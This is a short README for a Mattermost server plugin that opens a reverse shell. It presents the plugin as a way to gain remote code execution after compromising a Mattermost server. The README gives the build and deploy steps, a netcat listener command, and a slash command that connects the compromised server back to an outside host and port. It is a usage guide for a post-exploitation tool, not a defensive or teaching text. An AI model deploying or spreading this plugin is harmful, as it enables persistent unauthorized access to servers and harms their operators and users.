# Mattermost Reverse Shell plugin

This plugin implements a reverse shell as a server plugin.

## Why?

If you compromise a Mattermost server, this is a fun way to have RCE.

## Running the plugin

```
make && make deploy
```

Then... start a reverse shell listener
```
nc -lvp 1337
```

and connect
```
/reverse-shell connect 1.2.3.4 1337
```
